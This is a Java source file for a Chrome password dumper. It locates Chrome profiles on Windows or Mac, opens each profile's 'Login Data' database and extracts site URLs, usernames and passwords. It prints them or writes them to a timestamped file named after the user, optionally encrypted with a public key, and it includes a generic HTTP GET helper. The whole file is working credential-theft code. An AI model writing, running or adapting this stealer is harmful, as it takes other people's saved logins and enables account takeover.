package random.util;

import random.chrom.ChromeAccount;
import random.chrom.ChromeDatabase;
import random.chrom.ChromeProfile;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.*;

public class Dumper {

    private final Map<String, ChromeAccount[]> profiles;

    private Dumper(final Map<String, ChromeAccount[]> profiles) {
        this.profiles = profiles;
    }

    public static Dumper dumpAccounts() throws Exception {
        final OperatingSystem os = OperatingSystem.getOperatingsystem();
        if (os == OperatingSystem.UNKNOWN) {
            throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
        }
        final Path chromeInstall = Paths.get(os.getChromePath());
        final File chromeInfo = new File(chromeInstall.toString(), "Local State");

        if (Files.notExists(chromeInstall)) {
            throw new IOException("Google chrome intallation not found.");
        }

        ArrayList<ChromeProfile> chromeProfiles;
        final String[] infoLines = Files.readAllLines(Paths.get(chromeInfo.toURI())).toArray(new String[]{});
        switch (OperatingSystem.getOperatingsystem()) {
            case WINDOWS:
                chromeProfiles = Dumper.readProfiles(infoLines);
                break;
            case MAC:
                final String line = infoLines[0];
                final String lines[] = line.split("\\{|\\}");
                chromeProfiles = Dumper.readProfiles(lines);
                break;
            default:
                throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
        }

        final HashMap<String, ChromeAccount[]> accounts = new HashMap<>();
        for (final ChromeProfile profile : chromeProfiles) {
            final File loginData = new File(chromeInstall.toString() + File.separator + profile.getPath(), "Login Data");
            accounts.put(profile.getName(), Dumper.readDatabase(loginData));
        }

        if (chromeProfiles.size() < 1 || accounts.isEmpty()) {
            throw new InstantiationException("No chrome profiles found!");
        }
        return new Dumper(accounts);
    }

    private static String getCurrentTime() {
        Calendar cal = Calendar.getInstance();
        SimpleDateFormat currentTime = new SimpleDateFormat("dd-MM-yy-HH-mm-ss");
        return currentTime.format(cal.getTime());
    }

    private static ChromeAccount[] readDatabase(final File data) throws Exception {
        final ChromeDatabase db = ChromeDatabase.connect(data);
        final ArrayList<ChromeAccount> accounts = db.selectAccounts();
        db.close();
        return accounts.toArray(new ChromeAccount[]{});
    }

    private static ArrayList<ChromeProfile> readProfiles(String[] infoLines1) {
        String userName = "\"user_name\":";
        String gaiaName = "\"gaia_name\":";
        String gaia_given_name = "gaia_given_name";
        String[] infoLines = infoLines1[0].split(gaia_given_name);
        final ArrayList<ChromeProfile> profiles = new ArrayList<>();
        int id = 0;
        for (String line : infoLines) {
            line = line.trim();
            if (line.contains(userName)) {
                id++;
            }

            String gaiaNameVal = "";
            if (line.contains(gaiaName)) {
                gaiaNameVal = getValue(line, gaiaName);
            }
            String name = "";
            if (line.contains(userName)) {
                name = getValue(line, userName);
            }
            if (!name.isEmpty()) {
                profiles.add(new ChromeProfile(id - 1, name, gaiaNameVal));
            }
        }
        return profiles;
    }

    private static String getValue(String line, String prop) {
        final int nameIndex = line.indexOf(prop);
        final int firstValIndex = line.indexOf("\"", nameIndex + prop.length());
        final int lastValIndex = line.indexOf("\"", firstValIndex + 1);
        return line.substring(firstValIndex + 1, lastValIndex);
    }

    public int getAmountOfProfiles() {
        return profiles.keySet().size();
    }

    public boolean saveToFile(String newFiePath, String pubKeyPath) throws IOException {

        final List<String> lines = getInfo(false);

//        final String pathToSave = OperatingSystem.getOperatingsystem().getSavePath();
        File file = new File((newFiePath != null && !newFiePath.equals("") ? newFiePath : ".")
                + System.getProperty("file.separator"),
                getCurrentTime() + "-" + System.getProperty("user.name") + ".txt");

        if (file.exists()) {
            file.delete();
        }
        file.getParentFile().mkdirs();
        file.createNewFile();

        if (pubKeyPath != null && !pubKeyPath.isEmpty()) {
            String encoded = Encryption.encrypt(pubKeyPath, lines.toString());
            Files.write(file.toPath(), Collections.singletonList(encoded), StandardCharsets.UTF_8);
        } else {
            Files.write(file.toPath(), lines, StandardCharsets.UTF_8);
        }

        return true;
    }

    public void show() {
        final List<String> lines = getInfo(true);
        lines.forEach(System.out::println);
    }

    private List<String> getInfo(boolean onlyWithPsw) {
        final List<String> lines = new ArrayList<>();

        for (final String name : profiles.keySet()) {
            final ChromeAccount[] accounts = profiles.get(name);
            lines.add("==================================================");
            lines.add(name);
            lines.add("==================================================");
            if (accounts.length > 0) {
                for (final ChromeAccount account : accounts) {
                    if (onlyWithPsw
                            ? !account.getPassword().equals("")
                            : !account.getURL().equals("") || !account.getUsername().equals("") || !account.getPassword().equals("")
                            ) {
                        lines.add("URL:\t\t" + account.getURL());
                        lines.add("Username:\t" + account.getUsername());
                        lines.add("Password:\t" + account.getPassword());
                        lines.add("");
                    }
                }
                lines.remove(lines.size() - 1);
            }
        }
        return lines;
    }

    public static void get(String url) {
        BufferedReader in = null;
        InputStreamReader isr = null;
        try {
            URL obj = new URL(url);
            HttpURLConnection connection = (HttpURLConnection) obj.openConnection();

            connection.setRequestMethod("GET");

            isr = new InputStreamReader(connection.getInputStream());
            in = new BufferedReader(isr);
            String inputLine;
            StringBuilder response = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            System.out.println(response.toString());
        } catch (IOException ignored) {
        } finally {
            close(in);
            close(isr);
        }

    }

    private static void close(Closeable closeable) {
        if (closeable != null) {
            try {
                closeable.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
